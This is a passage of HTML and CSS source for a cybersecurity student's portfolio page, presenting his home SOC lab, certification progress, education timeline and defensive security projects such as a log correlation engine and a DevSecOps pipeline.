    font-family: var(--mono); font-size: 12px;
    letter-spacing: .04em; color: var(--text-hi);
  }
  .skill-bar-pct {
    font-family: var(--mono); font-size: 11px;
    color: var(--text-mid); opacity: .8;
  }
  .skill-bar-track {
    height: 3px; background: rgba(255,255,255,0.06);
    border-radius: 2px; overflow: hidden; position: relative;
  }
  .skill-bar-fill {
    height: 100%; border-radius: 2px;
    width: 0; transition: width 1.4s cubic-bezier(.16,1,.3,1);
  }
  .skill-bar-fill.blue  { background: linear-gradient(90deg, #4a64dc, #c8d6f8); }
  .skill-bar-fill.green { background: linear-gradient(90deg, #2ecc71, #52c97a); }
  .skill-bar-fill.amber { background: linear-gradient(90deg, #f5a623, #f5c842); }
  .skill-bar-fill.red   { background: linear-gradient(90deg, #e05252, #ff8c8c); }

  /* ── TIMELINE ── */
  .timeline {
    position: relative; margin-top: 2rem;
    padding-left: 1.5rem;
  }
  .timeline::before {
    content: '';
    position: absolute; left: 0; top: 6px; bottom: 6px;
    width: 1px; background: linear-gradient(to bottom, rgba(200,214,248,0.3), rgba(200,214,248,0.05));
  }
  .tl-item {
    position: relative; margin-bottom: 2rem;
  }
  .tl-item:last-child { margin-bottom: 0; }
  .tl-dot {
    position: absolute; left: -1.5rem; top: 5px;
    width: 7px; height: 7px; border-radius: 50%;
    background: var(--accent); transform: translateX(-3px);
    box-shadow: 0 0 8px rgba(200,214,248,0.4);
  }
  .tl-when {
    font-family: var(--mono); font-size: 11px;
    letter-spacing: .08em; text-transform: uppercase;
    color: var(--text-mid); opacity: .75; margin-bottom: .3rem;
  }
  .tl-title {
    font-family: var(--display); font-size: .95rem; font-weight: 700;
    color: var(--text-hi); letter-spacing: -.015em; margin-bottom: .2rem;
  }
  .tl-org {
    font-size: 13px; font-weight: 300; color: var(--text-mid);
    margin-bottom: .4rem;
  }
  .tl-desc {
    font-size: 13px; font-weight: 300; color: var(--text); line-height: 1.7;
  }

  /* ── CALLOUT BANNER ── */
  .callout-banner {
    margin-top: 4rem;
    border: 1px solid rgba(82,201,122,0.2);
    border-radius: 12px;
    background: rgba(82,201,122,0.03);
    padding: 2rem 2.5rem;
    display: flex; align-items: center; justify-content: space-between;
    gap: 2rem; flex-wrap: wrap;
    position: relative; overflow: hidden;
  }
  .callout-banner::before {
    content: '';
    position: absolute; top: 0; left: 0; right: 0; height: 1px;
    background: linear-gradient(90deg, transparent, rgba(82,201,122,0.4), transparent);
  }
  .callout-text { flex: 1; }
  .callout-title {
    font-family: var(--display); font-size: 1.2rem; font-weight: 700;
    color: var(--text-hi); letter-spacing: -.02em; margin-bottom: .4rem;
  }
  .callout-sub {
    font-size: 14px; font-weight: 300; color: var(--text); line-height: 1.6;
  }
  .callout-sub strong { color: var(--green); font-weight: 500; }

  /* ── RESUME DOWNLOAD ── */
  .btn-resume {
    display: inline-flex; align-items: center; gap: 8px;
    padding: 11px 22px;
    font-family: var(--sans); font-size: 13px; font-weight: 500;
    text-decoration: none; border-radius: 6px;
    background: rgba(82,201,122,0.1);
    border: 1px solid rgba(82,201,122,0.3);
    color: var(--green);
    transition: all .2s var(--ease-out);
    letter-spacing: .01em; white-space: nowrap;
  }
  .btn-resume:hover {
    background: rgba(82,201,122,0.18);
    border-color: rgba(82,201,122,0.5);
    transform: translateY(-2px);
    box-shadow: 0 8px 24px rgba(82,201,122,0.12);
  }

  /* ── FOOTER (expanded) ── */
  footer {
    padding: 3rem 2.5rem;
    border-top: 1px solid rgba(255,255,255,0.05);
    background: #040509;
  }
  .footer-inner {
    max-width: 860px; margin: 0 auto;
    display: flex; justify-content: space-between; align-items: flex-start;
    gap: 2rem; flex-wrap: wrap;
  }
  .footer-name {
    font-family: var(--display); font-size: 14px; font-weight: 600;
    color: var(--text-mid); margin-bottom: .4rem; letter-spacing: -.01em;
  }
  .footer-sub {
    font-family: var(--mono); font-size: 11px; color: var(--text-mid);
    line-height: 1.8; opacity: .65; letter-spacing: .04em;
  }
  .footer-links {
    display: flex; flex-direction: column; gap: .4rem; text-align: right;
  }
  .footer-links a {
    font-family: var(--mono); font-size: 12px; color: var(--text-mid);
    opacity: .65; text-decoration: none; transition: opacity .15s, color .15s;
    letter-spacing: .06em;
  }
  .footer-links a:hover { opacity: 1; color: var(--text-mid); }

  /* ── ANIMATIONS ── */
  @keyframes up {
    from { opacity: 0; transform: translateY(16px); }
    to   { opacity: 1; transform: none; }
  }
  .reveal { opacity: 0; transform: translateY(14px); transition: opacity .55s cubic-bezier(.16,1,.3,1), transform .55s cubic-bezier(.16,1,.3,1); }
  .reveal.in { opacity: 1; transform: none; }

  @media (max-width: 780px) {
    #mainnav { padding: 0 1.25rem; }
    .nav-links { display: none; }
    .nav-cta { display: none; }
    .nav-burger { display: flex; }

    section { padding: 3.5rem 1.25rem; }

    #hero {
      padding: 1.25rem; padding-top: 3.5rem; padding-bottom: 3rem;
      min-height: auto;
    }
    .hero-inner { grid-template-columns: 1fr; gap: 2.5rem; }
    .hero-divider { display: none; }
    .hero-left { padding-right: 0; }
    .hero-right { display: none; }
    .hero-scroll { display: none; }
    .hero-stats { max-width: 100%; }
    h1 { font-size: clamp(2.4rem, 9vw, 3.2rem); }

    .about-tagline p { font-size: 1.2rem; }
    .about-cols { grid-template-columns: 1fr; gap: 2rem; }
    .ctf-grid { grid-template-columns: 1fr; }
    .now-grid { grid-template-columns: 1fr; }
    .contact-cols { grid-template-columns: 1fr; gap: 2rem; }
    .contact-h2 { font-size: 2.2rem; }

    .proj-row { grid-template-columns: 1fr; gap: .75rem; }
    .proj-arrow { display: none; }
    .why-grid { grid-template-columns: 1fr; }

    .lab-stats { flex-wrap: wrap; }

    .diagram-wrap { padding: .75rem; }

    .footer-inner { flex-direction: column; gap: 1.25rem; }
    .footer-links { text-align: left; flex-direction: row; flex-wrap: wrap; gap: 1rem; }
  }

  @media (max-width: 500px) {
    .hero-actions { flex-direction: column; }
    .btn { width: 100%; justify-content: center; }
  }

  /* ── MOBILE DIAGRAM ── */
  .diagram-mobile { display: none; }
  .diagram-desktop { display: block; }
  .mob-hub { background:#07101e;border:1.5px solid rgba(74,100,220,.5);border-radius:8px;overflow:hidden;margin-bottom:1rem; }
  .mob-hub-bar { height:3px;background:linear-gradient(90deg,rgba(74,100,220,.6),rgba(200,214,248,.6),rgba(74,100,220,.6)); }
  .mob-hub-inner { display:flex;align-items:center;gap:.75rem;padding:.85rem 1rem .5rem; }
  .mob-hub-left { flex:1; }
  .mob-hub-name { display:block;font-family:var(--mono);font-size:14px;font-weight:600;color:#c8d6f8; }
  .mob-hub-ip   { display:block;font-family:var(--mono);font-size:11px;color:#4a6aaa;margin-top:2px; }
  .mob-status-dot { width:7px;height:7px;border-radius:50%;background:#2ecc71;box-shadow:0 0 7px #2ecc71;animation:blink 2s step-end infinite;flex-shrink:0; }
  .mob-online { font-family:var(--mono);font-size:9px;color:#2ecc71;letter-spacing:.1em; }
  .mob-hub-tags { display:flex;flex-wrap:wrap;gap:5px;padding:.5rem 1rem .85rem; }
  .mob-zones { display:flex;flex-direction:column;gap:.75rem; }
  .mob-zone { border-radius:6px;overflow:hidden;border:1px solid; }
  .mob-zone-mgmt { background:#0b1830;border-color:rgba(74,143,255,.25); }
  .mob-zone-sec  { background:#0a1c10;border-color:rgba(46,204,113,.25); }
  .mob-zone-mon  { background:#1a1408;border-color:rgba(245,200,66,.25); }
  .mob-zone-lab  { background:#1a0a0c;border-color:rgba(255,74,90,.25); }
  .mob-zone-label { font-family:var(--mono);font-size:10px;font-weight:700;letter-spacing:.1em;padding:.5rem .85rem;border-bottom:1px solid rgba(255,255,255,.06); }
  .mob-zone-mgmt .mob-zone-label { color:#4a8fff; }
  .mob-zone-sec  .mob-zone-label { color:#2ecc71; }
  .mob-zone-mon  .mob-zone-label { color:#f5c842; }
  .mob-zone-lab  .mob-zone-label { color:#ff4a5a; }
  .mob-node { display:flex;align-items:flex-start;gap:.75rem;padding:.65rem .85rem;border-bottom:1px solid rgba(255,255,255,.04); }
  .mob-node:last-child { border-bottom:none; }
  .mob-node-dot { width:7px;height:7px;border-radius:50%;margin-top:4px;flex-shrink:0;animation:blink 2s step-end infinite; }
  .mob-dot-blue  { background:#4a8fff;box-shadow:0 0 6px #4a8fff; }
  .mob-dot-green { background:#2ecc71;box-shadow:0 0 6px #2ecc71; }
  .mob-dot-amber { background:#f5c842;box-shadow:0 0 6px #f5c842; }
  .mob-dot-red   { background:#ff4a5a;box-shadow:0 0 6px #ff4a5a; }
  .mob-node-name { font-family:var(--mono);font-size:13px;font-weight:500;color:var(--text-hi); }
  .mob-node-ip   { font-family:var(--mono);font-size:11px;color:var(--text);margin:2px 0 5px; }
  .mob-node-tags { display:flex;flex-wrap:wrap;gap:4px; }
  .mob-tag { font-family:var(--mono);font-size:9px;font-weight:600;letter-spacing:.07em;padding:2px 7px;border-radius:3px;background:rgba(255,255,255,.05);border:1px solid rgba(255,255,255,.1);color:var(--text); }
  @media(max-width:780px){.diagram-mobile{display:block;}.diagram-desktop{display:none;}}

  /* ── SCROLL PROGRESS ── */
  #pg { position:fixed;top:0;left:0;z-index:9999;height:2px;width:0%;pointer-events:none;
    background:linear-gradient(90deg,#4a8fff,#c8d6f8,#4a8fff);background-size:200%;
    animation:pgshine 2s linear infinite; }
  @keyframes pgshine{0%{background-position:200% 0}100%{background-position:-200% 0}}

  /* ── SIDE NAV DOTS ── */
  #snav{position:fixed;right:22px;top:50%;transform:translateY(-50%);display:flex;flex-direction:column;gap:12px;z-index:200;}
  .snd{width:5px;height:5px;border-radius:50%;background:var(--border-hi);cursor:pointer;transition:all .2s;position:relative;}
  .snd::after{content:attr(data-l);position:absolute;right:14px;top:50%;transform:translateY(-50%);
    font-family:var(--mono);font-size:9px;color:var(--text-hi);white-space:nowrap;opacity:0;
    background:var(--surface2);padding:3px 8px;border-radius:3px;border:1px solid var(--border-hi);
    pointer-events:none;transition:opacity .15s;}
  .snd:hover::after{opacity:1;}
  .snd.on{background:var(--accent);box-shadow:0 0 8px rgba(200,214,248,.55);transform:scale(1.7);}
  @media(max-width:900px){#snav{display:none;}}

  /* ── CUSTOM CURSOR ── */
  #cdot{position:fixed;width:6px;height:6px;border-radius:50%;background:rgba(200,214,248,.85);pointer-events:none;z-index:9998;transform:translate(-50%,-50%);mix-blend-mode:screen;}
  #cring{position:fixed;width:26px;height:26px;border-radius:50%;border:1px solid rgba(200,214,248,.22);pointer-events:none;z-index:9997;transform:translate(-50%,-50%);transition:width .18s,height .18s,border-color .18s;}
  #cring.h{width:42px;height:42px;border-color:rgba(200,214,248,.5);}
  @media(hover:none){#cdot,#cring{display:none;}}

  /* ── THREAT TICKER — inline in lab section ── */
  #ticker{position:static;background:transparent;border:1px solid rgba(255,74,90,.15);border-radius:6px;overflow:hidden;height:32px;display:flex;align-items:center;margin-bottom:1.75rem;}
  #tlabel{flex-shrink:0;font-family:var(--mono);font-size:9px;font-weight:600;color:#ff4a5a;letter-spacing:.12em;
    padding:0 14px;border-right:1px solid rgba(255,74,90,.2);height:100%;display:flex;align-items:center;gap:7px;background:#080508;}
  #tlabel::before{content:'';width:6px;height:6px;border-radius:50%;background:#ff4a5a;animation:blink .9s step-end infinite;}
  #ttrack{flex:1;overflow:hidden;}
  #tinner{display:flex;white-space:nowrap;animation:tspin 60s linear infinite;}
  #tinner:hover{animation-play-state:paused;}
  .ti{font-family:var(--mono);font-size:9px;color:#3a4260;padding:0 36px;}
  .ti b{color:#5a6480;} .ti em{color:#ff8060;font-style:normal;} .ti i{color:#5a7890;font-style:normal;}
  .ti a{text-decoration:none;color:inherit;cursor:pointer;}
  .ti a:hover em{color:#ff6040;text-decoration:underline;}
  @keyframes tspin{0%{transform:translateX(0)}100%{transform:translateX(-50%)}}

  /* ── AVAILABILITY BANNER ── */
  #avail{display:flex;align-items:center;gap:12px;padding:.65rem 1.25rem;
    background:rgba(46,204,113,.06);border:1px solid rgba(46,204,113,.2);border-radius:6px;
    font-family:var(--mono);font-size:11px;color:#4ade80;margin-top:1.5rem;width:fit-content;}
  #avail-dot{width:8px;height:8px;border-radius:50%;background:#2ecc71;box-shadow:0 0 8px #2ecc71;animation:blink 2s step-end infinite;flex-shrink:0;}

  /* ── CERT PROGRESS WIDGET ── */
  .cert-block{background:var(--surface);border:1px solid var(--border);border-radius:6px;padding:1.25rem 1.5rem;margin-top:2rem;}
  .cert-block-title{font-family:var(--mono);font-size:9px;letter-spacing:.12em;text-transform:uppercase;color:var(--text);margin-bottom:1rem;}
  .crt{display:flex;align-items:center;gap:.75rem;padding:.4rem 0;border-bottom:1px solid var(--border);font-family:var(--mono);font-size:11px;}
  .crt:last-child{border-bottom:none;}
  .crt-name{flex:1;color:var(--text-mid);}
  .crt-bar{width:90px;height:3px;background:var(--border-hi);border-radius:2px;overflow:hidden;flex-shrink:0;}
  .crt-fill{height:100%;border-radius:2px;width:0;transition:width 1.4s cubic-bezier(.16,1,.3,1);}
  .crt-fill.a{background:#f5c842;} .crt-fill.b{background:#4a8fff;} .crt-fill.g{background:#2ecc71;}
  .crt-pct{font-size:10px;color:var(--text);width:30px;text-align:right;flex-shrink:0;}
  .crt-tag{font-size:9px;letter-spacing:.08em;padding:2px 7px;border-radius:3px;flex-shrink:0;}
  .crt-tag.ip{color:#f5c842;border:1px solid rgba(245,200,66,.3);background:rgba(245,200,66,.07);}
  .crt-tag.pl{color:#4a8fff;border:1px solid rgba(74,143,255,.3);background:rgba(74,143,255,.07);}
  .crt-tag.dn{color:#2ecc71;border:1px solid rgba(46,204,113,.3);background:rgba(46,204,113,.07);}

  /* ── KBD MODAL ── */
  #kbdm{display:none;position:fixed;inset:0;z-index:8000;background:rgba(5,8,16,.88);backdrop-filter:blur(8px);align-items:center;justify-content:center;}
  #kbdm.open{display:flex;}
  #kbdi{background:#0a0d1a;border:1px solid var(--border-hi);border-radius:10px;padding:2rem 2.5rem;min-width:360px;box-shadow:0 32px 80px rgba(0,0,0,.7);}
  #kbdi h3{font-family:var(--display);font-size:1rem;font-weight:600;color:var(--text-hi);margin-bottom:1.25rem;display:flex;justify-content:space-between;}
  #kbdi h3 button{background:none;border:none;color:var(--text);cursor:pointer;font-size:1.1rem;}
  .kr{display:flex;justify-content:space-between;align-items:center;padding:.5rem 0;border-bottom:1px solid var(--border);font-size:12px;}
  .kr:last-child{border-bottom:none;}
  .kr span{color:var(--text-mid);}
  kbd{font-family:var(--mono);font-size:10px;background:var(--surface2);color:var(--text-mid);border:1px solid var(--border-hi);border-radius:3px;padding:2px 7px;}

  /* ── COPY EMAIL ── */
  .cpybtn{background:none;border:1px solid var(--border);border-radius:3px;font-family:var(--mono);font-size:9px;
    color:var(--text);padding:2px 8px;cursor:pointer;transition:all .15s;margin-left:6px;letter-spacing:.06em;}
  .cpybtn:hover{border-color:var(--border-hi);color:var(--text-hi);}
  .cpybtn.ok{color:#2ecc71;border-color:#2ecc71;}

  /* ── FLOATING CONTACT ── */
  #fcta{position:fixed;bottom:24px;right:24px;z-index:300;display:flex;align-items:center;gap:9px;
    background:rgba(7,8,14,.92);border:1px solid rgba(200,214,248,.18);border-radius:40px;
    padding:10px 18px 10px 14px;font-family:var(--mono);font-size:10px;color:var(--text-mid);
    text-decoration:none;backdrop-filter:blur(16px);box-shadow:0 12px 40px rgba(0,0,0,.6),0 0 0 1px rgba(200,214,248,.05);
    opacity:0;transform:translateY(14px);transition:opacity .35s,transform .35s,border-color .15s;}
  #fcta.vis{opacity:1;transform:translateY(0);}
  #fcta:hover{border-color:rgba(200,214,248,.4);color:var(--text-hi);box-shadow:0 12px 40px rgba(0,0,0,.6),0 0 20px rgba(74,100,220,.1);}
  #fctad{width:7px;height:7px;border-radius:50%;background:#2ecc71;box-shadow:0 0 10px #2ecc71,0 0 20px rgba(82,201,122,.3);animation:blink 2s step-end infinite;}

  /* ── EASTER EGG ── */
  #egg{display:none;position:fixed;inset:0;z-index:9999;background:#000;align-items:center;justify-content:center;flex-direction:column;gap:1.5rem;}
  #egg.open{display:flex;}
  #egg pre{font-family:var(--mono);font-size:12px;color:#2ecc71;line-height:1.7;text-align:center;}
  #egg small{font-family:var(--mono);font-size:10px;color:#3a5a3a;}

  /* subtle konami hint — lives in the footer, barely visible */
  #konami-hint {
    font-family: var(--mono);
    font-size: 11px;
    color: rgba(255,255,255,0.18);
    letter-spacing: .18em;
    user-select: none;
    transition: color .4s;
    cursor: default;
  }
  #konami-hint:hover { color: rgba(46,204,113,0.5); }
  #konami-hint-label {
    font-family: var(--mono);
    font-size: 10px;
    color: rgba(255,255,255,0.1);
    letter-spacing: .1em;
    margin-right: .75rem;
    user-select: none;
  }
  #egg button{font-family:var(--mono);font-size:10px;color:#2ecc71;background:none;border:1px solid rgba(46,204,113,.3);border-radius:4px;padding:6px 16px;cursor:pointer;}
</style>
</head>
<body>


<!-- GRAIN OVERLAY -->
<div id="grain"></div>

<!-- SCROLL PROGRESS -->
<div id="pg"></div>

<!-- CUSTOM CURSOR -->
<div id="cdot"></div>
<div id="cring"></div>

<!-- SIDE NAV -->
<nav id="snav">
  <div class="snd on" data-l="HERO"     onclick="location.hash='#hero'"></div>
  <div class="snd"    data-l="ABOUT"    onclick="location.hash='#about'"></div>
  <div class="snd"    data-l="PROJECTS" onclick="location.hash='#projects'"></div>
  <div class="snd"    data-l="WHY"      onclick="location.hash='#why'"></div>
  <div class="snd"    data-l="CTF"      onclick="location.hash='#ctf'"></div>
  <div class="snd"    data-l="NOW"      onclick="location.hash='#now'"></div>
  <div class="snd"    data-l="LAB"      onclick="location.hash='#lab'"></div>
  <div class="snd"    data-l="CONTACT"  onclick="location.hash='#contact'"></div>
</nav>

<!-- FLOATING CTA -->


<!-- KEYBOARD SHORTCUTS MODAL -->
<div id="kbdm">
  <div id="kbdi">
    <h3>Keyboard Shortcuts <button onclick="closeKbd()">✕</button></h3>
    <div class="kr"><span>Open this menu</span><kbd>?</kbd></div>
    <div class="kr"><span>Jump to About</span><kbd>G</kbd> <kbd>A</kbd></div>
    <div class="kr"><span>Jump to Projects</span><kbd>G</kbd> <kbd>P</kbd></div>
    <div class="kr"><span>Jump to CTF writeups</span><kbd>G</kbd> <kbd>C</kbd></div>
    <div class="kr"><span>Jump to Lab diagram</span><kbd>G</kbd> <kbd>L</kbd></div>
    <div class="kr"><span>Jump to Contact</span><kbd>G</kbd> <kbd>E</kbd></div>
    <div class="kr"><span>Close</span><kbd>ESC</kbd></div>
  </div>
</div>

<!-- EASTER EGG -->
<div id="egg">
  <pre id="egg-pre"></pre>
  <button onclick="closeEgg()">exit</button>
</div>
<nav id="mainnav">
  <a href="#" class="nav-name">Matthew Vaishnav</a>
  <ul class="nav-links">
    <li><a href="#about">About</a></li>
    <li><a href="#projects">Projects</a></li>
    <li><a href="#why" style="color:var(--green);opacity:.85;">Why Me</a></li>
    <li><a href="#ctf">CTF</a></li>
    <li><a href="#now">Now</a></li>
    <li><a href="#contact">Contact</a></li>
  </ul>
  <a href="https://github.com/matthewvaishnav/cst-portfolio" class="nav-cta" target="_blank">View Repo →</a>
  <button class="nav-burger" id="burger" aria-label="Menu">
    <span></span><span></span><span></span>
  </button>
</nav>

<!-- MOBILE DRAWER -->
<div class="nav-drawer" id="drawer">
  <a href="#about"    onclick="closeDrawer()">About</a>
  <a href="#projects" onclick="closeDrawer()">Projects</a>
  <a href="#ctf"      onclick="closeDrawer()">CTF</a>
  <a href="#now"      onclick="closeDrawer()">Currently Working On</a>
  <a href="#lab"      onclick="closeDrawer()">Lab Diagram</a>
  <a href="#contact"  onclick="closeDrawer()">Contact</a>
</div>

<!-- HERO -->
<section id="hero">
  <div class="hero-inner">
    <!-- LEFT: text -->
    <div class="hero-left">
      <div class="hero-eyebrow">
        <span class="hero-eyebrow-dot"></span>
        <span>Available for co-op · Summer / Fall 2026</span>
      </div>
      <h1>
        <span class="name-first">Matthew Vaishnav</span>
        <span class="glitch-wrap" data-text="I build labs">I build labs</span><br>to learn how<br><em>things break.</em>
      </h1>
      <p class="hero-body">
        CST student at Conestoga. I run a segmented 18-node home lab, ship scripts that actually detect things, and document every decision.
      </p>
      <div class="hero-actions">
        <a href="https://github.com/matthewvaishnav/cst-portfolio" class="btn btn-solid" target="_blank">View the Work →</a>
        <a href="#contact" class="btn btn-ghost">Let's Talk</a>
        <a href="https://www.linkedin.com/in/matthew-vaishnav-279670229/" class="btn-resume" target="_blank">LinkedIn ↗</a>
      </div>
      <!-- STAT COUNTERS -->
      <div class="hero-stats">
        <div class="hero-stat">
          <span class="hero-stat-num" data-target="14822">0</span>
          <span class="hero-stat-label">log lines parsed</span>
        </div>
        <div class="hero-stat-divider"></div>
        <div class="hero-stat">
          <span class="hero-stat-num" data-target="847">0</span>
          <span class="hero-stat-label">attacks detected</span>
        </div>
        <div class="hero-stat-divider"></div>
        <div class="hero-stat">
          <span class="hero-stat-num" data-target="18">0</span>
          <span class="hero-stat-label">lab nodes</span>
        </div>
        <div class="hero-stat-divider"></div>
        <div class="hero-stat">
          <span class="hero-stat-num" data-target="5">0</span>
          <span class="hero-stat-label">VLANs isolated</span>
        </div>
      </div>
    </div>

    <!-- DIVIDER -->
    <div class="hero-divider"></div>

    <!-- RIGHT: animated terminal -->
    <div class="hero-right">
    <div class="hero-terminal">
      <div class="ht-bar">
        <div class="ht-dot ht-red"></div>
        <div class="ht-dot ht-yellow"></div>
        <div class="ht-dot ht-green"></div>
        <span class="ht-title" id="ht-title">soc-terminal — matthew@security-onion</span>
        <span id="ht-badge" style="font-family:var(--mono);font-size:9px;letter-spacing:.1em;padding:2px 8px;border-radius:3px;background:rgba(245,200,66,0.12);border:1px solid rgba(245,200,66,0.3);color:#f5c842;margin-left:auto;margin-right:0;display:none;">⚠ INCIDENT ACTIVE</span>
      </div>
      <div class="ht-body" id="terminal-output"></div>
      <div id="ht-input-row" style="display:none;padding:.5rem 1.25rem .85rem;border-top:1px solid rgba(255,255,255,0.05);">
        <div style="display:flex;align-items:center;gap:.5rem;">
          <span class="ht-prompt" style="color:var(--accent);font-family:var(--mono);font-size:12px;flex-shrink:0;">analyst@soc:~$</span>
          <input id="ht-input" autocomplete="off" spellcheck="false" style="flex:1;background:none;border:none;outline:none;font-family:var(--mono);font-size:12px;color:#e4e8f4;caret-color:var(--accent);" placeholder="type a command…">
        </div>
      </div>
    </div>
    </div><!-- end hero-right -->
  </div>

  <div class="hero-scroll">
    <div class="hero-scroll-line"></div>
    <span>Scroll</span>
  </div>
</section>

<!-- ABOUT -->
<section id="about">
  <div class="inner">
    <div class="s-label reveal">
      <span class="s-label-txt">About</span>
      <div class="s-label-line"></div>
    </div>
    <div class="about-tagline reveal">
      <p>"Most people learn security by reading. I learn by building a lab that actually alerts when I'm wrong."</p>
    </div>
    <div class="about-cols">
      <div class="about-text reveal">
        <p>I'm a Computer Systems Technician student at Conestoga who learns by building things, then finding out why they're broken. My home lab isn't a checklist — it's 18 virtual machines across 5 isolated VLANs, running a full SOC stack because I wanted to understand what Security Onion actually sees when Kali attacks Metasploitable.</p>
        <p>The log correlation engine I wrote parsed 14,822 entries on first run and flagged a brute-force chain I'd deliberately planted. The DevSecOps pipeline failed Trivy on my own container image. That's the point: <strong>I build until it's real enough to actually fail, then I fix it</strong>.</p>
        <p>I'm pursuing work in SOC analysis or IT infrastructure — somewhere I can take rote knowledge from a classroom and apply it to something that matters.</p>
      </div>
      <div class="reveal">
        <div class="profile-card">
          <div class="profile-head">
            <div class="profile-head-dot"></div>
            <span>Profile</span>
          </div>
          <div class="profile-row"><span class="pk">Program</span><span class="pv">CST — Conestoga</span></div>
          <div class="profile-row"><span class="pk">Graduating</span><span class="pv">April 2027</span></div>
          <div class="profile-row"><span class="pk">Location</span><span class="pv">Kitchener-Waterloo, ON</span></div>
          <div class="profile-row"><span class="pk">Lab nodes</span><span class="pv">18 VMs · 5 VLANs</span></div>
          <div class="profile-row"><span class="pk">Security+</span><span class="pv"><span class="sdot s-amber"></span>62% · Target S26</span></div>
          <div class="profile-row"><span class="pk">THM SOC L2</span><span class="pv"><span class="sdot s-amber"></span>78% complete</span></div>
          <div class="profile-row"><span class="pk">Co-op</span><span class="pv"><span class="sdot s-green"></span>Open · S/F 2026</span></div>
        </div>
      </div>
    </div>
  

      <!-- CERT PROGRESS -->
      <div class="cert-block reveal">
        <div class="cert-block-title">Certification Progress</div>
        <div class="crt">
          <span class="crt-name">CompTIA Security+</span>
          <div class="crt-bar"><div class="crt-fill a" data-w="62"></div></div>
          <span class="crt-pct">62%</span>
          <span class="crt-tag ip">IN PROGRESS</span>
        </div>
        <div class="crt">
          <span class="crt-name">TryHackMe SOC Level 2</span>
          <div class="crt-bar"><div class="crt-fill b" data-w="78"></div></div>
          <span class="crt-pct">78%</span>
          <span class="crt-tag ip">IN PROGRESS</span>
        </div>
        <div class="crt">
          <span class="crt-name">Cisco Packet Tracer</span>
          <div class="crt-bar"><div class="crt-fill g" data-w="100"></div></div>
          <span class="crt-pct">100%</span>
          <span class="crt-tag dn">COMPLETE</span>
        </div>
        <div class="crt">
          <span class="crt-name">CompTIA A+ (planned)</span>
          <div class="crt-bar"><div class="crt-fill a" data-w="15"></div></div>
          <span class="crt-pct">15%</span>
          <span class="crt-tag pl">PLANNED</span>
        </div>
      </div>

      <!-- EDUCATION & PROGRESSION TIMELINE -->
      <div style="margin-top:3.5rem;" class="reveal">
        <div class="s-label" style="margin-bottom:1.75rem;">
          <span class="s-label-txt">Education &amp; Progression</span>
          <div class="s-label-line"></div>
        </div>
        <div class="timeline">
          <div class="tl-item">
            <div class="tl-dot" style="background:var(--green);box-shadow:0 0 8px rgba(82,201,122,0.5);"></div>
            <div class="tl-when">Sept 2024 — Present</div>
            <div class="tl-title">Computer Systems Technician (CST)</div>
            <div class="tl-org">Conestoga College · Kitchener-Waterloo, ON</div>
            <div class="tl-desc">Networking fundamentals, server administration, security principles, and applied systems. Graduating April 2027.</div>
          </div>
          <div class="tl-item">
            <div class="tl-dot" style="background:var(--accent);"></div>
            <div class="tl-when">2024 — Ongoing</div>
            <div class="tl-title">Self-Built 18-Node Home Lab</div>
            <div class="tl-org">Personal Project · Proxmox + pfSense + Security Onion</div>
            <div class="tl-desc">Designed and operate a segmented SOC lab from scratch — VLAN architecture, IDS/IPS, full observability stack, and IaC provisioning for every node.</div>
          </div>
          <div class="tl-item">
            <div class="tl-dot" style="background:var(--amber);"></div>
            <div class="tl-when">2024 — Ongoing</div>
            <div class="tl-title">TryHackMe — SOC Level 2 Path</div>
            <div class="tl-org">78% complete · Blue team focus</div>
            <div class="tl-desc">Working through SOC analyst scenarios, threat intel, log analysis, and SIEM operation. Every lab paired with a detection-focused writeup.</div>
          </div>
          <div class="tl-item">
            <div class="tl-dot" style="background:var(--amber);"></div>
            <div class="tl-when">Target: Summer 2026</div>
            <div class="tl-title">CompTIA Security+</div>
            <div class="tl-org">62% study progress</div>
            <div class="tl-desc">Scheduled alongside co-op search. Validates foundational knowledge already applied in the lab environment.</div>
          </div>
        </div>
      </div>
</div>
</section>

<!-- PROJECTS -->
<section id="projects">
  <div class="inner">
    <div class="s-label reveal">
      <span class="s-label-txt">Projects</span>
      <div class="s-label-line"></div>
    </div>

    <p class="proj-intro reveal">Every project here runs against something real — either my own lab or a cloud environment. <strong>Output first, description second.</strong></p>

    <a href="https://github.com/matthewvaishnav/cst-portfolio/tree/main/soc" class="proj-row reveal" target="_blank">
      <div>
        <div class="proj-kicker">Python · Security</div>
        <div class="proj-title">SOC Log Correlation Engine</div>
        <div class="proj-impact"><span class="proj-metric">14,822</span> log entries parsed · <span class="proj-metric">3</span> high-severity alerts on first run</div>
        <div class="proj-desc">Multi-source correlation across auth.log and web access logs. Detects brute-force chains, scanner-to-admin-path recon, and credential stuffing — all mapped to MITRE ATT&CK. Ships a static HTML incident report.</div>
      </div>
      <div class="proj-arrow">↗</div>
    </a>

    <a href="https://github.com/matthewvaishnav/cst-portfolio/tree/main/scripting" class="proj-row reveal" target="_blank">
      <div>
        <div class="proj-kicker">Bash · PowerShell · Python</div>
        <div class="proj-title">Security Scripting Suite</div>
        <div class="proj-impact">CIS Benchmark hardening · AD audit with HTML report output</div>
        <div class="proj-desc">CIS Benchmark server hardening automation, Windows security audit with Active Directory enumeration, and a network recon tool with service fingerprinting and CVE flagging. Production-quality output — every script exits with a structured report.</div>
      </div>
      <div class="proj-arrow">↗</div>
    </a>

    <a href="https://github.com/matthewvaishnav/cst-portfolio/tree/main/devops" class="proj-row reveal" target="_blank">
      <div>
        <div class="proj-kicker">Terraform · Ansible · Docker · GitHub Actions</div>
        <div class="proj-title">DevSecOps Pipeline</div>
        <div class="proj-impact">Caught <span class="proj-metric">6</span> critical CVEs in container images before deploy</div>
        <div class="proj-desc">End-to-end CI/CD with SAST (Bandit, Semgrep), Trivy container scanning, Terraform-managed AWS VPC with flow logging, Ansible provisioning, and hardened images. Pipeline fails on CVSS ≥ 7 — the way it should.</div>
      </div>
      <div class="proj-arrow">↗</div>
    </a>

    <a href="https://github.com/matthewvaishnav/cst-portfolio/tree/main/monitoring" class="proj-row reveal" target="_blank">
      <div>
        <div class="proj-kicker">Docker Compose · Prometheus · Grafana · Loki</div>
        <div class="proj-title">Self-Hosted SOC Monitoring Stack</div>
        <div class="proj-impact">7 services · persistent storage · pre-built alerting rules</div>
        <div class="proj-desc">Full observability stack — Prometheus, Grafana, Loki, Promtail, AlertManager, Node Exporter, cAdvisor — all on an isolated Docker network. Dashboards show CPU, memory, disk, container health, and log anomalies in one pane.</div>
      </div>
      <div class="proj-arrow">↗</div>
    </a>

    <a href="https://github.com/matthewvaishnav/cst-portfolio" class="proj-row reveal" target="_blank">
      <div>
        <div class="proj-kicker">Ansible · WireGuard · pfSense · GitHub Actions</div>
